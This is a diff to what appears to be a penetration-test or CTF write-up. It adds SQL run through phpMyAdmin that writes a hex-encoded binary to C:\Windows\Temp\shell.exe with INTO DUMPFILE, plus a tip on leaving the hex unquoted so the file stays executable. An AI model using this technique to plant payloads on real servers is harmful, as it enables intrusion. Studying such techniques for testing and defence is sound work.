@@ -132,8 +132,17 @@ now we have two options `dumpfile` and `outfile`
 | `INTO DUMPFILE` | Binary files (exe, dll)    | Writes raw bytes exactly ✅                       |
 | `INTO OUTFILE`  | Text files (bat, xml, ps1) | Adds newlines, escapes chars — breaks binaries ❌ |
 
-executed this command on phpmyadmin to e
+executed this command on phpmyadmin to overright the file 
+
+⚠️ **Critical: No quotes around hex value**
+
+```sql
+SELECT 0x4d5a...   INTO DUMPFILE 'path'  -- ✅ raw binary written
+SELECT '0x4d5a...' INTO DUMPFILE 'path'  -- ❌ text string written, not executable
+```
 
 ```sql
 SELECT 0x[your hex data] INTO DUMPFILE 'C:\\Windows\\Temp\\shell.exe'
 ```
+
+after execution i found it via my shell and varified that it exists 
